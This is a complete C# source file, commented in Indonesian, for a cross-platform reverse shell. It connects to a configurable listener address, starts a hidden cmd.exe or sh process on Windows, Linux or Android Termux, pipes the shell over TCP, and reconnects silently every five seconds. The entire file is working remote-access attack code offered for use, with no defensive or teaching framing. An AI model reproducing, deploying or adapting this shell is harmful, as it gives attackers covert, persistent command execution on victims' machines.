using System;
using System.IO;
using System.Net.Sockets;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;

class MultiPlatformShell {
    private static string ip = "127.0.0.1"; // Ganti dengan IP Listener Anda
    private static int port = 4444;         // Ganti dengan Port Listener Anda

    static void Main() {
        // Loop utama untuk rekoneksi otomatis jika koneksi terputus
        while (true) {
            try {
                RunShell();
            } catch {
                // Gagal terhubung? Tunggu 5 detik lalu coba lagi (silent retry)
                Thread.Sleep(5000);
            }
        }
    }

    static void RunShell() {
        using (TcpClient client = new TcpClient(ip, port)) {
            using (Stream stream = client.GetStream()) {
                using (StreamReader reader = new StreamReader(stream)) {
                    using (StreamWriter writer = new StreamWriter(stream)) {
                        writer.AutoFlush = true;

                        Process p = new Process();
                        
                        // Deteksi OS dan tentukan shell biner yang sesuai
                        if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows)) {
                            p.StartInfo.FileName = "cmd.exe";
                        } else {
                            // Mencakup Linux desktop, server, dan Android (Termux)
                            // Catatan: Termux biasanya menggunakan /data/data/com.termux/files/usr/bin/sh
                            // tetapi symlink global 'sh' tetap tersedia di environment PATH.
                            p.StartInfo.FileName = "sh"; 
                        }

                        // Konfigurasi agar berjalan di latar belakang (tanpa jendela/interaksi lokal)
                        p.StartInfo.UseShellExecute = false;
                        p.StartInfo.RedirectStandardInput = true;
                        p.StartInfo.RedirectStandardOutput = true;
                        p.StartInfo.RedirectStandardError = true;
                        p.StartInfo.CreateNoWindow = true; // Sembunyikan jendela di Windows

                        // Mengalirkan output dari shell kembali ke network socket secara asinkron
                        p.OutputDataReceived += (s, e) => { if (e.Data != null) writer.WriteLine(e.Data); };
                        p.ErrorDataReceived  += (s, e) => { if (e.Data != null) writer.WriteLine(e.Data); };

                        p.Start();
                        p.BeginOutputReadLine();
                        p.BeginErrorReadLine();

                        // Membaca perintah input dari network socket dan meneruskannya ke shell
                        string line;
                        while ((line = reader.ReadLine()) != null) {
                            if (line.Trim().Equals("exit", StringComparison.OrdinalIgnoreCase)) {
                                p.Kill();
                                return;
                            }
                            p.StandardInput.WriteLine(line);
                        }
                    }
                }
            }
        }
    }
}
